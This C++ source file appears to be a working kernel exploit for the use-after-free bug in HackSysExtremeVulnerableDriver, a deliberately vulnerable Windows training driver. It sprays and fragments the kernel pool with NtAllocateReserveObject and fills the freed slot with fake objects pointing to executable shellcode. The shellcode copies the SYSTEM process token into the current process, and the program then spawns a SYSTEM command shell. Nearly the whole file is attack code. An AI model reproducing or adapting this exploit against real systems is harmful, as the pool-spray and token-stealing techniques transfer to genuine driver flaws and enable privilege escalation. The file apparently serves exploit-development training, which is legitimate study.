#include <iostream>
#include <windows.h>
#include <vector>

// IOCTL Definitions from HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)

// From Common.h
typedef void (*FunctionPointer)();

// USE_AFTER_FREE object from UseAfterFree.h
typedef struct _USE_AFTER_FREE {
        FunctionPointer Callback;
        CHAR Buffer[0x54];
    } USE_AFTER_FREE, *PUSE_AFTER_FREE;

// Type definitions for NtAllocateReserveObject

// Declaration of unicode string for object attributes
// https://docs.microsoft.com/en-us/windows/win32/api/lsalookup/ns-lsalookup-lsa_unicode_string
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;

// Declaration of object attributes for usage in NtAllocateReserveObject
// https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

#define POBJECT_ATTRIBUTES OBJECT_ATTRIBUTES*

// Basically declares a function pointer to the NtAllocateReserveObject
// https://wj32.org/wp/2010/07/18/the-nt-reserve-object/
typedef NTSTATUS(WINAPI *_NtAllocateReserveObject)(
	OUT PHANDLE hObject,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN DWORD ObjectType);

std::pair<std::vector<HANDLE>, std::vector<HANDLE>> spray_pool(int objects_n){
    // Use a quarter of the spray to defragment the heap
    // Use the rest for sequential heap allocations
    int defrag_n = 0.25 * objects_n;
    int seq_n = objects_n - defrag_n;

    std::cout << "Number of defrag objects to allocate: " << defrag_n << "\n";
    std::cout << "Number of sequential objects to allocate: " << seq_n << "\n";

    // Vectors storing the handles to all allocated objects
    std::vector<HANDLE> defrag_handles;
    std::vector<HANDLE> seq_handles;

    // Need to get address of the NtAllocateReserveObject from ntdll.dll
    _NtAllocateReserveObject NtAllocateReserveObject = 
        (_NtAllocateReserveObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateReserveObject");

    if (!NtAllocateReserveObject){
        std::cout << "Could not get NtAllocateReserveObject\n";
        exit(1);
    }

    for (int i = 0; i < defrag_n; i++){
        HANDLE handle = 0;
        // Allocate object, use 1 since we want to allocate the IoCompletionReserve object
        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&handle, NULL, 1);
        // Push handle to vector
        defrag_handles.push_back(handle);
    }

    for (int i = 0; i < seq_n; i++){
        HANDLE handle = 0;
        // Allocate object, use 1 since we want to allocate the IoCompletionReserve object
        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&handle, NULL, 1);
        // Push handle to vector
        seq_handles.push_back(handle);
    }

    std::cout << "Allocated " << defrag_handles.size()  << " defrag objects\n";
    std::cout << "Allocated " << seq_handles.size()  << " sequential objects\n";

    return std::make_pair(defrag_handles, seq_handles);
}

int main(int argc, char* argv[]){
    if (argc < 2){
        std::cout << "Usage: " << argv[0] << " <number-of-pool-allocations>\n";
        exit(1);
    }

    int poolAllocs = atoi(argv[1]);

    char devName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
    DWORD inBuffSize = 1024;
    DWORD bytesRet = 0;
    BYTE* inBuffer = (BYTE*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBuffSize);
    RtlFillMemory(inBuffer, inBuffSize, 'A');

    // Get a handle to the driver
    std::cout << "Getting handle to driver";
    HANDLE dev = CreateFile(devName, GENERIC_READ | GENERIC_WRITE, 
                                NULL, NULL, OPEN_EXISTING, NULL, NULL);

    // Handle failure
    if (dev == INVALID_HANDLE_VALUE){
        std::cerr << "Could not get device handle" << std::endl;
        return 1;
    }

    // Spray the pool
    std::cout << "Spraying the pool\n";
    std::pair<std::vector<HANDLE>, std::vector<HANDLE>> handles = spray_pool(poolAllocs);

    // Create holes in the pool
    std::cout << "Creating " << handles.second.size() << " holes\n";
    for (int i = 0; i < handles.second.size(); i++){
        if (i % 2){
            CloseHandle(handles.second[i]);
            handles.second[i] = NULL;
        }
    }

    std::cout << "Sending IOCTLs\n";

    // Allocate the UAF Object
    std::cout << "Allocating UAF Object\n";
    BOOL status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);

    // Free the UAF Object
    std::cout << "Freeing UAF Object\n";
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);
    
    // Shellcode snippet from @tekwizz123
    // TODO: Write own shellcode?
    char payload[] = (
                        "\x60" // PUSHAD
                        "\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
                        "\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
                        "\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
                        "\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
                                                    // #---[Copy System PID token]
                        "\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
                        "\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
                        "\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
                        "\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
                        "\x75\xED" // jnz                                          -> |
                        "\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
                        "\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
                                                    //#---[Recover]
                        "\x61" // popad
                        "\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
                        "\xC3" // RET 
                        );

    // Set up payload buffer
    DWORD payloadSize = sizeof(payload);
    LPVOID payloadAddr = VirtualAlloc(NULL, payloadSize,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    memcpy(payloadAddr, payload, payloadSize);
    LPVOID payloadAddrPtr = &payloadAddr;

    std::cout << "Payload adddress is: " << payloadAddr << '\n';

    // Must set up the structure of the fake object so that
    // it matches the structure of the UAF Object
    DWORD totalObjectSize = 0x58;
    BYTE payloadBuffer[0x58] = {0};
    // Set the first 4 bytes to be the address to the payload function
    memcpy(payloadBuffer, payloadAddrPtr, 4);

    // Fill gaps with Fake Objects
    std::cout << "Allocating fake objects\n";
    std::cout << "Allocating " << handles.second.size() / 2 << " fake objects\n";
    for (int i = 0; i < handles.second.size() / 2; i++){
        status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT,
                                    payloadBuffer, totalObjectSize, NULL, 
                                    0, &bytesRet, NULL);
    }

    // Use the UAF Object after Free
    std::cout << "Using UAF Object after free\n";
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_USE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);

    // Spawning shell code snippet from @tekwizz123
    std::cout << "Spawning shell\n";
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    // Close device
    CloseHandle(dev);
    return 0;
}
